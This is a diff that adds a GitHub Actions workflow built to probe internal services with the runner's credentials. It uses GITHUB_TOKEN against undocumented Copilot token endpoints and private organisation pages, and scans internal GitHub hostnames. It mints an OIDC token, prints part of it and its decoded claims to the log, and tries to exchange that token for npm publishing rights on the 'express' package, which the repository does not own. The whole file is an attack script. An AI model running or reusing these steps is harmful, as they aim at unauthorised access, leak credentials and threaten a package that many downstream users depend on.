@@ -1,0 +1,79 @@
+name: Internal Endpoint Probe
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe internal endpoints with GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== GITHUB_TOKEN type and scopes ==="
+          curl -s -I "https://api.github.com/user" \
+            -H "Authorization: Bearer $GH_TOKEN" 2>&1 | grep -iE 'x-oauth-scopes|x-accepted'
+          
+          echo ""
+          echo "=== copilot_internal/user ==="
+          curl -s "https://api.github.com/copilot_internal/user" \
+            -H "Authorization: Bearer $GH_TOKEN" | head -20
+          
+          echo ""
+          echo "=== copilot_internal/v2/token ==="
+          curl -s "https://api.github.com/copilot_internal/v2/token" \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Editor-Version: vscode/1.100.0" | head -10
+          
+          echo ""
+          echo "=== Agent tasks on this repo issues ==="
+          for num in 29 30 31; do
+            echo "--- issue $num ---"
+            curl -s "https://github.com/toofikz/public-test-repo/issues/$num/agent_tasks" \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H "Accept: application/json" \
+              -H "X-Requested-With: XMLHttpRequest" | head -5
+          done
+          
+          echo ""
+          echo "=== Security campaigns ==="
+          curl -s "https://github.com/orgs/tooforg/security/campaigns" \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/json" \
+            -H "X-Requested-With: XMLHttpRequest" | head -5
+          
+          echo ""
+          echo "=== Copilot endpoints from runner ==="
+          curl -s "https://api.individual.githubcopilot.com/_ping" | head -5
+          curl -s "https://proxy.individual.githubcopilot.com/_ping" | head -5
+          
+          echo ""
+          echo "=== OIDC token request ==="
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://npmjs.org" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value','ERROR'))")
+          echo "OIDC token (first 50 chars): ${OIDC_TOKEN:0:50}..."
+          
+          echo ""
+          echo "=== OIDC token claims ==="
+          echo "$OIDC_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
+          
+          echo ""
+          echo "=== Try npm OIDC exchange with valid OIDC token ==="
+          curl -s -X POST "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/express" \
+            -H "Authorization: Bearer $OIDC_TOKEN" \
+            -H "Content-Type: application/json" | head -10
+          
+          echo ""
+          echo "=== Runner environment secrets (redacted names only) ==="
+          env | grep -E '^(GITHUB_|ACTIONS_|RUNNER_)' | sort | sed 's/=.*/=***/'
+          
+          echo ""
+          echo "=== Check if we can reach internal GitHub services ==="
+          for host in "github.net" "githubapp.com" "github.localhost"; do
+            echo "--- $host ---"
+            curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "https://$host" 2>&1 || echo "timeout"
+          done
